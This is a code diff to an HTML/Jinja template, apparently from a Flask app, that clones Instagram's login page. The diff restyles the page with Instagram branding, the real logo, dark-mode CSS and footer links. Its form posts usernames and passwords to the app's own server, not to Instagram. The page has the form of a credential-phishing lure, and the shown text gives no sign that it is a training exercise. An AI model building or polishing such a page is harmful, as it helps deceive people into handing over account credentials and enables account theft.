@@ -2,122 +2,349 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Instagram</title>
-    <link data-default-icon="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png" rel="icon" sizes="192x192" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
+    <title>Instagram Login</title>
+    <style>
+        :root {
+            --bg-color: #fafafa;
+            --card-bg: #ffffff;
+            --text-color: #262626;
+            --button-bg: #0095f6;
+            --border-color: #dbdbdb;
+            --secondary-text: #8e8e8e;
+            --link-color: #00376b;
+            --fb-blue: #385185;
+            --footer-text: #737373;
+        }
+
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --bg-color: #000000;
+                --card-bg: #000000;
+                --text-color: #f5f5f5;
+                --button-bg: #0095f6;
+                --border-color: #363636;
+                --secondary-text: #a8a8a8;
+                --link-color: #e0f1ff;
+                --fb-blue: #8cb4f6;
+                --footer-text: #a8a8a8;
+            }
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            text-decoration: none;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px 0 60px;
+            font-size: 16px; 
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            max-width: 400px;
+            width: 100%;
+            flex-grow: 1;
+            justify-content: center;
+        }
+
+        .login-card {
+            background-color: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 12px; 
+            padding: 30px 40px; 
+            margin-bottom: 15px;
+            width: 100%;
+            text-align: center;
+        }
+
+        .logo {
+            margin: 20px auto 30px;
+            width: 200px; 
+            display: none;
+        }
+
+        .light-logo {
+            display: block;
+        }
+
+        .dark-logo {
+            filter: invert(1);
+            display: block !important;
+        }
+
+        @media (prefers-color-scheme: dark) {
+            .light-logo {
+                display: none;
+            }
+            .dark-logo {
+                display: block;
+            }
+        }
+
+        .form-group {
+            margin-bottom: 12px; 
+            position: relative;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px 12px;
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 6px; 
+            color: var(--text-color);
+            font-size: 16px; 
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #a8a8a8;
+        }
+
+        .login-button {
+            width: 100%;
+            background-color: var(--button-bg);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 12px 16px; 
+            font-weight: 600;
+            margin: 12px 0; 
+            cursor: pointer;
+            opacity: 0.7;
+            font-size: 16px; 
+        }
+
+        .login-button.active {
+            opacity: 1;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 16px 0 24px; 
+            color: var(--secondary-text);
+            font-size: 16px;
+            font-weight: 600;
+        }
+
+        .divider::before, .divider::after {
+            content: "";
+            flex: 1;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .divider::before {
+            margin-right: 20px; 
+        }
+
+        .divider::after {
+            margin-left: 20px; 
+        }
+
+        .facebook-login {
+            color: var(--fb-blue);
+            font-weight: 600;
+            font-size: 16px; 
+            margin: 12px 0 16px; 
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .facebook-login img {
+            width: 20px; 
+            margin-right: 10px; 
+        }
+
+        .forgot-password {
+            font-size: 14px; 
+            color: var(--link-color);
+            margin-top: 16px; 
+            display: block;
+        }
+
+        .signup-card {
+            background-color: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 24px; 
+            width: 100%;
+            text-align: center;
+            font-size: 16px;
+        }
+
+        .signup-card a {
+            color: var(--button-bg);
+            font-weight: 600;
+            font-size: 16px;
+        }
+
+        footer {
+            width: 100%;
+            text-align: center;
+            padding: 24px 0;
+            font-size: 14px; 
+            color: var(--footer-text);
+            margin-top: auto;
+        }
+
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 16px; 
+            margin-bottom: 16px; 
+        }
+
+        .footer-links a {
+            color: var(--footer-text);
+            font-size: 14px; 
+        }
+
+        .copyright {
+            margin-top: 16px; 
+            font-size: 14px; 
+        }
+
+        select {
+            font-size: 14px; 
+            padding: 4px 8px;
+        }
+
+        @media (max-width: 450px) {
+            body {
+                background-color: var(--card-bg);
+                padding: 0 0 60px;
+                font-size: 14px; 
+            }
+            
+            .login-card, .signup-card {
+                border: none;
+                background-color: transparent;
+                padding: 20px;
+            }
+            
+            .container {
+                max-width: 100%;
+                padding: 0 20px;
+            }
+            
+            input {
+                font-size: 14px;
+                padding: 12px 10px;
+            }
+            
+            .login-button, .signup-card, .signup-card a {
+                font-size: 14px;
+            }
+        }
+
+        .erromsg p {
+            color: red;
+            text-align: center;
+            margin-top: 20px;
+            font-size: 1.2em;
+        }
+    </style>
 </head>
 <body>
-<div class="wrapper">
-    <div class="image-desktop">
-        <img src="{{ url_for('static', filename='pcimage.png') }}" alt="Your Image" style="width: 100%;">
-    </div>
-    <div class="header">
-        <div class="top">
-            <div class="logo">
-                <img src="{{ url_for('static', filename='instagram.png') }}" alt="instagram" style="width: 175px;">
-            </div>
-            <div class="form">
-                <form id="loginForm" action="/" method="post">
-                    <div class="input_field">
-                        <input type="text" id="username" name="username" placeholder="Phone number, username, or email" class="input" required>
-                    </div>
-                    <div class="input_field">
-                        <input type="password" id="password" name="password" placeholder="Password" class="input" required>
-                    </div>
-                    <div class="btn"><button type="submit">Log In</button></div>
-                    <p id="error-message" style="color: red; display: none;"></p>
-                </form>
-            </div>
-            <div class="or">
-                <div class="line"></div>
-                <p>OR</p>
-                <div class="line"></div>
-            </div>
-            <div class="dif">
-                <div class="fb">
-                    <img src="{{ url_for('static', filename='facebook.png') }}" alt="facebook">
-                    <a href="https://www.facebook.com/login.php">ㅤLog In with Facebook</a>
+    <div class="container">
+        <div class="login-card">
+            <img 
+                src="https://www.instagram.com/static/images/web/logged_out_wordmark-2x.png/d2529dbef8ed.png" 
+                alt="Instagram" 
+                class="logo light-logo"
+            >
+            
+            <img 
+                src="https://www.instagram.com/static/images/web/logged_out_wordmark-2x.png/d2529dbef8ed.png" 
+                alt="Instagram" 
+                class="logo dark-logo"
+            >
+            
+            <form id="loginForm" action="/" method="post">
+                <div class="form-group">
+                    <input type="text" id="username" name="username" placeholder="Phone number, username, or email" class="input"  minlength="1" required>
                 </div>
-                <br>
-                <div class="erromsg">
-                {% if result %} <p>{{ result }}</p> {% endif %}
+                <div class="form-group">
+                    <input type="password" id="password" name="password" placeholder="Password" class="input" required minlength="6">
                 </div>
-                <br>
-                <div class="forgot">
-                    <a href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
-                </div>
-            </div>
-        </div>
-        <div class="signup">
-            <p>Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a></p>
-        </div>
-        <div class="apps">
-            <p>Get the app.</p>
-            <div class="icons">
-                <a href="https://apps.apple.com/us/app/instagram/id389801252"><img src="{{ url_for('static', filename='appstore.png') }}" alt="appstore"></a>
-                <a href="https://play.google.com/store/apps/details?id=com.instagram.android"><img src="{{ url_for('static', filename='googleplay.png') }}" alt="googleplay"></a>
-            </div>
-        </div>
-    </div>
-    <div class="footer">
-        <div class="links">
-            <ul>
-                <li><a href="https://about.meta.com/">Meta</a></li>
-                <li><a href="https://about.instagram.com/">About</a></li>
-                <li><a href="https://about.instagram.com/blog">Blog</a></li>
-                <li><a href="https://about.instagram.com/about-us/careers">Jobs</a></li>
-                <li><a href="https://help.instagram.com/">Help</a></li>
-                <li><a href="https://developers.facebook.com/docs/instagram">API</a></li>
-                <li><a href="https://privacycenter.instagram.com/">Privacy</a></li>
-                <li><a href="https://www.instagram.com/privacy/cookie_settings/">Cookie Settings</a></li>
-                <li><a href="https://help.instagram.com/581066165581870/">Terms</a></li>
-                <li><a href="https://www.instagram.com/explore/locations/">Locations</a></li>
-                <li><a href="https://www.instagram.com/web/lite/">Instagram Lite</a></li>
-                <li><a href="https://www.threads.net/">Threads</a></li>
-                <li><a href="https://www.facebook.com/help/instagram/261704639352628">Data Policy</a></li>
-                <li><a href="https://about.meta.com/technologies/meta-verified/">Meta Verified</a></li>
-            </ul>
-        </div>
-    </div>
-    <div class="languages">
-        <select name="languages" id="languages">
-            <option value="tr.html">English (UK)</option>
-            <option value="ar.html">العربية</option>
-            <option value="cs.html">Čeština</option>
-            <option value="da.html">Dansk</option>
-            <option value="de.html">Deutsch</option>
-            <option value="el.html">Ελληνικά</option>
-            <option value="af.html">Afrikaans</option>
-            <option value="en-uk.html">Türkçe</option>
-            <option value="es-es.html">Español (España)</option>
-            <option value="es.html">Español</option>
-            <option value="fa.html">فارسی</option>
-            <option value="fi.html">Suomi</option>
-            <option value="fr.html">Français</option>
-            <option value="he.html">עברית</option>
-            <option value="id.html">Bahasa Indonesia</option>
-            <option value="no.html">Norsk</option>
-            <option value="nl.html">Nederlands</option>
-            <option value="pl.html">Polski</option>
-            <option value="ru.html">Русский</option>
-            <option value="sv.html">Svenska</option>
-            <option value="fil.html">Filipino</option>
-            <option value="tr.html">English</option>
-            <option value="zh-cn.html">中文(简体)</option>
-            <option value="gu.html">ગુજરાતી</option>
-            <option value="hr.html">Hrvatski</option>
-            <option value="fr-ca.html">Français (Canada)</option>
-            <option value="ro.html">Română</option>
-            <option value="sr.html">Српски</option>
-        </select>
-        <p id="cinsta">© 2024 Instagram from Meta</p>
-    </div>
-</div>
+                <button type="submit" class="login-button">Log in</button>
+            </form>
+            
+            <div class="divider">OR</div>
+            
+            <a href="https://www.facebook.com/login.php" class="facebook-login">
+                Log in with Facebook
+            </a>
 
-<script>
-    async function handleLogin(event) {
+            <div class="erromsg">
+                {% if result %} <p>{{ result }}</p> {% endif %}
+            </div>
+            
+            <a href="https://www.instagram.com/accounts/password/reset/" class="forgot-password">Forgot password?</a>
+        </div>
+        
+        <div class="signup-card">
+            Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a>
+        </div>
+    </div>
+    
+    <footer>
+        <div class="footer-links">
+            <a href="#">Meta</a>
+            <a href="#">About</a>
+            <a href="#">Blog</a>
+            <a href="#">Jobs</a>
+            <a href="#">Help</a>
+            <a href="#">API</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+            <a href="#">Locations</a>
+            <a href="#">Instagram Lite</a>
+            <a href="#">Threads</a>
+            <a href="#">Contact Uploading & Non-Users</a>
+            <a href="#">Meta Verified</a>
+        </div>
+        <div class="copyright">
+            <select style="background: transparent; color: var(--footer-text); border: none; margin-right: 10px;">
+                <option>English</option>
+            </select>
+            © 2025 Instagram from Meta
+        </div>
+    </footer>
+
+    <script>
+        const inputs = document.querySelectorAll('input');
+        const loginButton = document.querySelector('.login-button');
+
+        inputs.forEach(input => {
+            input.addEventListener('input', () => {
+                const allFilled = Array.from(inputs).every(input => input.value.trim() !== '');
+                if (allFilled) {
+                    loginButton.classList.add('active');
+                } else {
+                    loginButton.classList.remove('active');
+                }
+            });
+        });
+
+
+        async function handleLogin(event) {
         event.preventDefault();
 
         const form = event.target;
@@ -143,6 +370,6 @@
             errorMessageElement.style.display = 'block';
         }
     }
-</script>
+    </script>
 </body>
 </html>
